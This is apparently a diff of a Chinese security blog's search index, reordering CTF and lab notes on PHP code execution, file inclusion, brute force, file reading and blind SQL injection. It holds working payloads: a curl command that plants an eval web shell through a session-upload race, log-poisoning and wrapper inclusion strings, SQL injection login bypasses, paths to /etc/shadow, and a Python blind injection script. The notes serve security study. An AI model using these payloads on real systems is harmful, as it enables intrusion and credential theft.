-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl ...../test.php -H &quot;Cookie:PHPSESSID=abc&quot; -F &quot;PHP_SESSION_UPLOAD_PROGRESS=&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);?&gt;&quot; -F &quot;file=@/etc/passwd&quot;</span><br></pre></td></tr></table></figure>
+<p>2、</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_place</span><br><span class="line">存在危险修饰符/e</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abc&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">这里匹配到了abc可直接执行传入的内容。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;,&#x27;$ret=&quot;\\1&quot;;&#x27;,$cmd)//反斜杠转义/，说明是字符串的内容。</span><br><span class="line">	echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>加代理，使用burp</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x 127.0.0.1:8090...</span><br></pre></td></tr></table></figure>
+<p>3、自定义函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可构造特殊字符串传递给该函数执行任意命令。</span><br><span class="line">&lt;?php</span><br><span class="line">	$func=create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">	$func();</span><br><span class="line">?&gt;</span><br><span class="line">第一个为参数，第二个为代码。</span><br></pre></td></tr></table></figure>
 
 
 
-<p>由于session_upload_progress.cleaned开启，需要竞争上传。</p>
-<p>最终要不断访问的文件名为：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_abc</span><br></pre></td></tr></table></figure>
+<p>4、动态函数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function a()&#123;</span><br><span class="line">	echo &#x27;a&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($_GET[&quot;func&quot;]))&#123;</span><br><span class="line">		$myfunc=$_GET[&quot;func&quot;]</span><br><span class="line">		$myfunc();</span><br><span class="line">	&#125;</span><br><span class="line">传入?func=phpinfo	</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">传入</span><br><span class="line">?a=assert&amp;b=phpinfo()</span><br></pre></td></tr></table></figure>
 
-<p>直到生成shell.php。</p>
+
+
+<p>用户自定义函数回调</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用is_callable函数来确定某函数是否可回调</span><br><span class="line">输出1表示可，没输出不可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传递数组类型</span><br><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$arrar[0]=$cmd;</span><br><span class="line">	call_user_func_array(&#x27;assert&#x27;,$array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果代码没有转为数组，我们可以直接传入数组</span><br><span class="line"></span><br><span class="line">?cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$array1=array($cmd);</span><br><span class="line">	$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">	array_filter($array,$func)</span><br><span class="line">?&gt;</span><br><span class="line">这个函数不同于上面，这里参数在前，函数在后。</span><br><span class="line"></span><br><span class="line">php5.6以上</span><br><span class="line">sort</span><br><span class="line">usort($_GET)</span><br><span class="line"></span><br><span class="line">?1[]=phpinfo()&amp;1[]=123&amp;2=assert()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>5、其他</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;php代码&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">	$&#123;php代码&#125;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">$func=$&#123;phpinfo()&#125;;</span><br><span class="line">$func();</span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1027,71 +1037,61 @@
       </tags>
   </entry>
   <entry>
-    <title>CTF-代码执行</title>
-    <url>/2021/05/21/CTF-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</url>
-    <content><![CDATA[<h2 id="代码执行介绍"><a href="#代码执行介绍" class="headerlink" title="代码执行介绍"></a>代码执行介绍</h2><p>五类相关函数</p>
-<p>1、eval+assert函数</p>
-<p>2、preg_replace/e最新php不支持，php5广泛使用</p>
-<p>3、用户自定义函数</p>
-<p>4、动态函数</p>
-<p>5、其他</p>
+    <title>CTF-文件包含</title>
+    <url>/2021/05/23/CTF-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php伪协议事实上就是其支持的协议与封装协议</span><br></pre></td></tr></table></figure>
+
 <span id="more"></span>
 
-<p>1、</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval(php4 php5 php7)--把字符串作为php代码执行，当用户可以控制字符串内容，那么此时存在代码注入漏洞。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	eval(&#x27;phpinfo;&#x27;);</span><br><span class="line">?&gt;</span><br><span class="line">eval执行的代码必须加分号，不然会报错。</span><br><span class="line">assert类似，但是兼容性更强，字符串中可不加分号，但是php7.1以上已经废弃assert</span><br></pre></td></tr></table></figure>
+<p>参考文档：</p>
+<p><a href="https://www.php.net/manual/zh/wrappers.php">https://www.php.net/manual/zh/wrappers.php</a></p>
+<p>当只允许上传zip文件</p>
+<p>使用zip协议phar协议解压</p>
+<p>文件包含漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">	include($file.&quot;php&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>安全人员防御：加引号</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	eval(&quot;\$ret=strtolower(&#x27;$cmd&#x27;);&quot;)//将字符串转为小写，反斜杠转义$,为了不当做变量处理</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>绕过方法：</p>
+<p>新建一个test.php</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	phpinfo();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>绕过姿势：</p>
-<p>闭合+注释</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;);phpinfo();//注释掉后面的内容</span><br><span class="line">传入变成</span><br><span class="line">$ret=strtolower(&#x27;&#x27;);phpinfo();//</span><br></pre></td></tr></table></figure>
+<p>使用zip进行无损压缩test.php，phpinfo.zip</p>
+<p>利用伪协议 解压缩zip文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=zip://upload/phpinfo.zip%23phpinfo</span><br><span class="line">?file=phar://upload/phpinfo.zip/phpinfo</span><br><span class="line">phar要在php5.3后的版本使用</span><br></pre></td></tr></table></figure>
 
-<p>如果安全人员开启了GPC将无法绕过</p>
-<p>因为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;会变成\&#x27;</span><br></pre></td></tr></table></figure>
+<p>如果后面拼接的是jpg，</p>
+<p>解决方法，新建php文件改名为jpg，然后压缩即可。</p>
+<h4 id="日志文件的利用"><a href="#日志文件的利用" class="headerlink" title="日志文件的利用"></a>日志文件的利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无法找到包含的文件，此时可使用日志文件</span><br></pre></td></tr></table></figure>
 
+<p>环境：httpd.conf文件中的配置CustomLog”logs/access.log”common</p>
+<p>通过burp访问参数，不然会记录到日志文件后会被URL编码，导致无法当作php代码执行。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=&lt;?php+phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
 
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php5之前，magic_quotes_gpc默认开启，但是在php的cookies中，如果有单引号将会被反斜杠转义，现在差不多淘汰，一般使用stripslashes函数转义</span><br><span class="line">传入1&#x27;直接变成\&#x27;</span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<p>2、</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_place</span><br><span class="line">存在危险修饰符/e</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&quot;/abc/e&quot;,$_REQUEST[&#x27;cmd&#x27;],&quot;abc&quot;)</span><br><span class="line">?&gt;</span><br><span class="line">这里匹配到了abc可直接执行传入的内容。</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	preg_place(&#x27;/&lt;data&gt;(.*)&lt;\/data&gt;/e&#x27;,&#x27;$ret=&quot;\\1&quot;;&#x27;,$cmd)//反斜杠转义/，说明是字符串的内容。</span><br><span class="line">	echo $ret;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">传入</span><br><span class="line">?cmd=&lt;data&gt;&#123;$&#123;phpinfo()&#125;&#125;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
-
-
-
-<p>3、自定义函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create_function主要用来创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可构造特殊字符串传递给该函数执行任意命令。</span><br><span class="line">&lt;?php</span><br><span class="line">	$func=create_function(&#x27;&#x27;,$_REQUEST[&#x27;cmd&#x27;]);</span><br><span class="line">	$func();</span><br><span class="line">?&gt;</span><br><span class="line">第一个为参数，第二个为代码。</span><br></pre></td></tr></table></figure>
-
-
-
-<p>4、动态函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	function a()&#123;</span><br><span class="line">	echo &#x27;a&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	if(isset($_GET[&quot;func&quot;]))&#123;</span><br><span class="line">		$myfunc=$_GET[&quot;func&quot;]</span><br><span class="line">		$myfunc();</span><br><span class="line">	&#125;</span><br><span class="line">传入?func=phpinfo	</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	$_GET[&#x27;a&#x27;]($_GET[&#x27;b&#x27;]);</span><br><span class="line">?&gt;</span><br><span class="line">传入</span><br><span class="line">?a=assert&amp;b=phpinfo()</span><br></pre></td></tr></table></figure>
-
-
-
-<p>用户自定义函数回调</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(&#x27;assert&#x27;,$_GET[&#x27;cmd&#x27;]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用is_callable函数来确定某函数是否可回调</span><br><span class="line">输出1表示可，没输出不可。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">传递数组类型</span><br><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$arrar[0]=$cmd;</span><br><span class="line">	call_user_func_array(&#x27;assert&#x27;,$array);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">如果代码没有转为数组，我们可以直接传入数组</span><br><span class="line"></span><br><span class="line">?cmd[]=phpinfo()</span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$cmd=$_GET[&#x27;cmd&#x27;];</span><br><span class="line">	$array1=array($cmd);</span><br><span class="line">	$func=$_GET[&#x27;func&#x27;];</span><br><span class="line">	array_filter($array,$func)</span><br><span class="line">?&gt;</span><br><span class="line">这个函数不同于上面，这里参数在前，函数在后。</span><br><span class="line"></span><br><span class="line">php5.6以上</span><br><span class="line">sort</span><br><span class="line">usort($_GET)</span><br><span class="line"></span><br><span class="line">?1[]=phpinfo()&amp;1[]=123&amp;2=assert()</span><br></pre></td></tr></table></figure>
+<p>然后通过文件包含漏洞页面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=../../../Extensions\Apache2.4.39\logs/access.log</span><br></pre></td></tr></table></figure>
 
 
 
 
 
-<p>5、其他</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;php代码&#125;</span><br><span class="line">&lt;?php</span><br><span class="line">	$&#123;php代码&#125;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">$func=$&#123;phpinfo()&#125;;</span><br><span class="line">$func();</span><br></pre></td></tr></table></figure>
+<h4 id="session会话利用"><a href="#session会话利用" class="headerlink" title="session会话利用"></a>session会话利用</h4><p>关键点：</p>
+<p>php7.2之后，提供了如果提交表单数据具有PHP_SESSION_UPLOAD_PROGRESS=上传后具体session名称 和file=@具体文件路径，此时可保存指定session名称的会话文件。</p>
+<p>session_upload_progress.enabled开启</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl ...../test.php -H &quot;Cookie:PHPSESSID=abc&quot; -F &quot;PHP_SESSION_UPLOAD_PROGRESS=&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);?&gt;&quot; -F &quot;file=@/etc/passwd&quot;</span><br></pre></td></tr></table></figure>
 
 
 
+<p>加代理，使用burp</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -x 127.0.0.1:8090...</span><br></pre></td></tr></table></figure>
+
+
+
+<p>由于session_upload_progress.cleaned开启，需要竞争上传。</p>
+<p>最终要不断访问的文件名为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sess_abc</span><br></pre></td></tr></table></figure>
+
+<p>直到生成shell.php。</p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1263,6 +1263,22 @@
       </tags>
   </entry>
   <entry>
+    <title>Brute Force</title>
+    <url>/2021/01/10/Force/</url>
+    <content><![CDATA[<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。</p>
+<span id="more"></span>
+
+<ul>
+<li>low<br>查看源码，可以发现，服务器只是验证参数login是否设置，<br>isset函数在服务器中检测变量是否被设置，返回true/false，没有任何防爆机制，且存在sql注入。<br>方法一(sql注入)：在username框输入admin’# 或者 admin’ or ‘1’=’1即可成功登陆。<br>原理为 and的优先级高于or。<br>方法二(burp爆破)抓包下来，放到intruder爆破，只对参数password进行爆破，<br><img src="/2021/01/10/Force/1.png"><br>换到payload，再添加字典，最后开始attack。<br><img src="/2021/01/10/Force/2.png"><br>成功爆破，返回页面长度和其他不一样的。<br><img src="/2021/01/10/Force/3.png"></li>
+<li>medium<br>可以看到，medium级别的代码对用户输入的参数进行了简单的过滤，对一些预定义字符进行了转义，基本上防止了SQL注入。<br>还有一个措施就是如果密码输错了，则延时两秒之后才能再次提交。<br>用burp爆破与low操作一样，只是少了sql注入。</li>
+<li>high<br>使用了Anti-CSRF token来抵御CSRF攻击，使用了函数stripslashes和mysqli_real_esacpe_string来抵御sql注入和xss攻击。<br>由于使用了Anti-CSRF token，每次服务器返回登陆页面都会包含一个随机的user_token值，每次用户登陆要一起提交，<br>所以服务器接到请求，会先检查user_token值，再进行sql查询，所以使用不再使用burp的无脑爆破。<br>这里有两种方法：<br>方法一：写python脚本，先模拟服务器发出请求获得一个token值，再利用获得的token值进行爆破。(脚本后续补上)<br>方法二：还是可以使用burp爆破，需要修改一些设置。<br><img src="/2021/01/10/Force/4.png">参加两个爆破参数。<br>这里攻击类型也要相应修改，为pitchfock，线程设为1。<br>找到Grep-Extract模块进行相应设置，add：</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>暴力破解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Linux-基础知识</title>
     <url>/2021/05/25/Linux-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
     <content><![CDATA[<h3 id="linux基础知识"><a href="#linux基础知识" class="headerlink" title="linux基础知识"></a>linux基础知识</h3><h4 id="linux反弹shell命令"><a href="#linux反弹shell命令" class="headerlink" title="linux反弹shell命令"></a>linux反弹shell命令</h4><span id="more"></span>
@@ -1315,22 +1331,6 @@
 ]]></content>
       <tags>
         <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Brute Force</title>
-    <url>/2021/01/10/Force/</url>
-    <content><![CDATA[<h3 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h3><p>即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。</p>
-<span id="more"></span>
-
-<ul>
-<li>low<br>查看源码，可以发现，服务器只是验证参数login是否设置，<br>isset函数在服务器中检测变量是否被设置，返回true/false，没有任何防爆机制，且存在sql注入。<br>方法一(sql注入)：在username框输入admin’# 或者 admin’ or ‘1’=’1即可成功登陆。<br>原理为 and的优先级高于or。<br>方法二(burp爆破)抓包下来，放到intruder爆破，只对参数password进行爆破，<br><img src="/2021/01/10/Force/1.png"><br>换到payload，再添加字典，最后开始attack。<br><img src="/2021/01/10/Force/2.png"><br>成功爆破，返回页面长度和其他不一样的。<br><img src="/2021/01/10/Force/3.png"></li>
-<li>medium<br>可以看到，medium级别的代码对用户输入的参数进行了简单的过滤，对一些预定义字符进行了转义，基本上防止了SQL注入。<br>还有一个措施就是如果密码输错了，则延时两秒之后才能再次提交。<br>用burp爆破与low操作一样，只是少了sql注入。</li>
-<li>high<br>使用了Anti-CSRF token来抵御CSRF攻击，使用了函数stripslashes和mysqli_real_esacpe_string来抵御sql注入和xss攻击。<br>由于使用了Anti-CSRF token，每次服务器返回登陆页面都会包含一个随机的user_token值，每次用户登陆要一起提交，<br>所以服务器接到请求，会先检查user_token值，再进行sql查询，所以使用不再使用burp的无脑爆破。<br>这里有两种方法：<br>方法一：写python脚本，先模拟服务器发出请求获得一个token值，再利用获得的token值进行爆破。(脚本后续补上)<br>方法二：还是可以使用burp爆破，需要修改一些设置。<br><img src="/2021/01/10/Force/4.png">参加两个爆破参数。<br>这里攻击类型也要相应修改，为pitchfock，线程设为1。<br>找到Grep-Extract模块进行相应设置，add：</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>暴力破解</tag>
       </tags>
   </entry>
   <entry>
@@ -1624,34 +1624,6 @@ EOF;
       </tags>
   </entry>
   <entry>
-    <title>ctf之任意文件读取漏洞总结</title>
-    <url>/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>   下面是对任意文件漏洞读取的简单总结：</p>
-<span id="more"></span>
-
-<h3 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h3><h4 id="相关web语言"><a href="#相关web语言" class="headerlink" title="相关web语言"></a>相关web语言</h4><h5 id="1、php"><a href="#1、php" class="headerlink" title="1、php"></a>1、php</h5><p><em><strong>如</strong></em></p>
-<p><em><strong>文件读取函数：</strong></em></p>
-<p><em><strong>file_get_contents()、file()、fopen()、 fread()、 fgets()、 readline()等等</strong></em></p>
-<p><em><strong>文件包含相关函数：</strong></em></p>
-<p><em><strong>include、require、include_once、require_once</strong></em></p>
-<p><em><strong>通过php读文件的执行系统命令：</strong></em></p>
-<p><em><strong>system、exec</strong></em></p>
-<p><em><strong>还有php伪协议读取文件</strong></em></p>
-<h5 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h5><p><em><strong>如</strong></em></p>
-<p><em><strong>os.path.join()函数</strong></em></p>
-<h5 id="3、java"><a href="#3、java" class="headerlink" title="3、java"></a>3、java</h5><p><em><strong>FileInputStream函数、XXE导致的文件读取，java一些模块也支持file://协议，在CTF很常见。</strong></em></p>
-<h5 id="4、Ruby"><a href="#4、Ruby" class="headerlink" title="4、Ruby"></a>4、Ruby</h5><p><em><strong>与Rails框架相关</strong></em></p>
-<h5 id="5、Node"><a href="#5、Node" class="headerlink" title="5、Node"></a>5、Node</h5><p><em><strong>Node.js的express模块。</strong></em></p>
-<h4 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h4><h4 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h4><p><em><strong>/etc/目录</strong></em></p>
-<p><em><strong>/etc/passwd</strong></em></p>
-<p><em><strong>/etc/shadow</strong></em></p>
-<p><em><strong>等等</strong></em></p>
-]]></content>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>ctf之信息收集总结</title>
     <url>/2021/04/18/ctf%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
     <content><![CDATA[<h2 id="web入门"><a href="#web入门" class="headerlink" title="web入门"></a>web入门</h2><h3 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h3><h4 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h4><h5 id="git常规泄露"><a href="#git常规泄露" class="headerlink" title="git常规泄露"></a>git常规泄露</h5><p>工具：</p>
@@ -1717,6 +1689,34 @@ EOF;
 <p>2、使用已有工具</p>
 <p><strong>Wappalyzer工具</strong></p>
 <p>除了使用工具，还可以随意输入一些参数，可能会出现404或302跳转出一些信息。</p>
+]]></content>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf之任意文件读取漏洞总结</title>
+    <url>/2021/04/19/ctf%E4%B9%8B%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<p>   下面是对任意文件漏洞读取的简单总结：</p>
+<span id="more"></span>
+
+<h3 id="任意文件读取漏洞"><a href="#任意文件读取漏洞" class="headerlink" title="任意文件读取漏洞"></a>任意文件读取漏洞</h3><h4 id="相关web语言"><a href="#相关web语言" class="headerlink" title="相关web语言"></a>相关web语言</h4><h5 id="1、php"><a href="#1、php" class="headerlink" title="1、php"></a>1、php</h5><p><em><strong>如</strong></em></p>
+<p><em><strong>文件读取函数：</strong></em></p>
+<p><em><strong>file_get_contents()、file()、fopen()、 fread()、 fgets()、 readline()等等</strong></em></p>
+<p><em><strong>文件包含相关函数：</strong></em></p>
+<p><em><strong>include、require、include_once、require_once</strong></em></p>
+<p><em><strong>通过php读文件的执行系统命令：</strong></em></p>
+<p><em><strong>system、exec</strong></em></p>
+<p><em><strong>还有php伪协议读取文件</strong></em></p>
+<h5 id="2、python"><a href="#2、python" class="headerlink" title="2、python"></a>2、python</h5><p><em><strong>如</strong></em></p>
+<p><em><strong>os.path.join()函数</strong></em></p>
+<h5 id="3、java"><a href="#3、java" class="headerlink" title="3、java"></a>3、java</h5><p><em><strong>FileInputStream函数、XXE导致的文件读取，java一些模块也支持file://协议，在CTF很常见。</strong></em></p>
+<h5 id="4、Ruby"><a href="#4、Ruby" class="headerlink" title="4、Ruby"></a>4、Ruby</h5><p><em><strong>与Rails框架相关</strong></em></p>
+<h5 id="5、Node"><a href="#5、Node" class="headerlink" title="5、Node"></a>5、Node</h5><p><em><strong>Node.js的express模块。</strong></em></p>
+<h4 id="中间件-服务器相关"><a href="#中间件-服务器相关" class="headerlink" title="中间件/服务器相关"></a>中间件/服务器相关</h4><h4 id="文件读取漏洞常见读取路径"><a href="#文件读取漏洞常见读取路径" class="headerlink" title="文件读取漏洞常见读取路径"></a>文件读取漏洞常见读取路径</h4><p><em><strong>/etc/目录</strong></em></p>
+<p><em><strong>/etc/passwd</strong></em></p>
+<p><em><strong>/etc/shadow</strong></em></p>
+<p><em><strong>等等</strong></em></p>
 ]]></content>
       <tags>
         <tag>CTF</tag>
@@ -1832,6 +1832,19 @@ EOF;
       </tags>
   </entry>
   <entry>
+    <title>python</title>
+    <url>/2021/01/16/python/</url>
+    <content><![CDATA[<h3 id="在windows环境下运行python脚本出现中文错误的解决办法："><a href="#在windows环境下运行python脚本出现中文错误的解决办法：" class="headerlink" title="在windows环境下运行python脚本出现中文错误的解决办法："></a>在windows环境下运行python脚本出现中文错误的解决办法：</h3><p>*<strong>原因：中文windows默认的输出编码为gbk，与脚本中定义的UTF-8不一样，所以出现了解码失败的情况。</strong><br><strong>方法一：先把中文解码为utf-8然后再转化为gbk输出。</strong></p>
+<span id="more"></span>
+
+<p>例如：<code># -*- coding:utf-8 -*- a=&quot;你好&quot; print(a.decode(&#39;utf-8&#39;).encode(&#39;gbk&#39;))</code><br><strong>方法二：在创建一个新文件夹，把脚本放入里面，打开cmd，输入python 脚本名.py就不会出现编码错误。</strong><br>这里附上一个python盲注脚本(只有盲注数据库长度，后面的盲注也是类似的。)：<br>`#!/usr/bin/python3</p>
+<p><code># -*- coding:utf-8 -*-</code><br>import requests</p>
+<p>def ascii_str():#生成库名表名字符所在的字符列表字典<br>    str_list=[]<br>    for i in range(33,127):#所有可显示字符<br>        str_list.append(chr(i))<br>    print(‘可显示字符：%s’%str_list)<br>    return str_list#返回字符列表</p>
+<p>def db_length(url,str):<br>    print(“[-]开始测试数据库名长度…….”)<br>    num=1<br>    while True:<br>        db_payload=url+”‘ and (length(database())=%d)–+”%num<br>        r=requests.get(db_payload)<br>        if str in r.text:<br>            db_length=num<br>            print(“[+]数据库长度：%d\n”%db_length)<br>            break<br>        else:<br>            num += 1</p>
+<p><code>if __name__ == &#39;__main__&#39;:</code><br>    url=”<a href="http://localhost1/Less-5/?id=1&quot;#%E7%9B%AE%E6%A0%87url">http://localhost1/Less-5/?id=1&quot;#目标url</a><br>    str=”You are in”#布尔型盲注的true&amp;false的判断因素<br>    db_length(url,str)#程序入口`<br><img src="/2021/01/16/python/1.png"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>Weak Password Burst</title>
     <url>/2021/01/24/wepd/</url>
     <content><![CDATA[<h3 id="弱口令破解登陆目标服务器"><a href="#弱口令破解登陆目标服务器" class="headerlink" title="弱口令破解登陆目标服务器"></a>弱口令破解登陆目标服务器</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><pre><code>nmap
@@ -1850,17 +1863,24 @@ EOF;
       </tags>
   </entry>
   <entry>
-    <title>python</title>
-    <url>/2021/01/16/python/</url>
-    <content><![CDATA[<h3 id="在windows环境下运行python脚本出现中文错误的解决办法："><a href="#在windows环境下运行python脚本出现中文错误的解决办法：" class="headerlink" title="在windows环境下运行python脚本出现中文错误的解决办法："></a>在windows环境下运行python脚本出现中文错误的解决办法：</h3><p>*<strong>原因：中文windows默认的输出编码为gbk，与脚本中定义的UTF-8不一样，所以出现了解码失败的情况。</strong><br><strong>方法一：先把中文解码为utf-8然后再转化为gbk输出。</strong></p>
+    <title>XSS</title>
+    <url>/2021/01/08/xss/</url>
+    <content><![CDATA[<p><strong>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上是一种注入攻击，<br>是指黑客在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在浏览器执行，如获取用户cookie信息。<br>需要强调的是，XSS不仅仅限制于JavaScript，还包括flash等其他脚本语言。<br>根据恶意代码是否存储在服务器中，XSS可分为存储型XSS和反射型XSS。</strong></p>
 <span id="more"></span>
 
-<p>例如：<code># -*- coding:utf-8 -*- a=&quot;你好&quot; print(a.decode(&#39;utf-8&#39;).encode(&#39;gbk&#39;))</code><br><strong>方法二：在创建一个新文件夹，把脚本放入里面，打开cmd，输入python 脚本名.py就不会出现编码错误。</strong><br>这里附上一个python盲注脚本(只有盲注数据库长度，后面的盲注也是类似的。)：<br>`#!/usr/bin/python3</p>
-<p><code># -*- coding:utf-8 -*-</code><br>import requests</p>
-<p>def ascii_str():#生成库名表名字符所在的字符列表字典<br>    str_list=[]<br>    for i in range(33,127):#所有可显示字符<br>        str_list.append(chr(i))<br>    print(‘可显示字符：%s’%str_list)<br>    return str_list#返回字符列表</p>
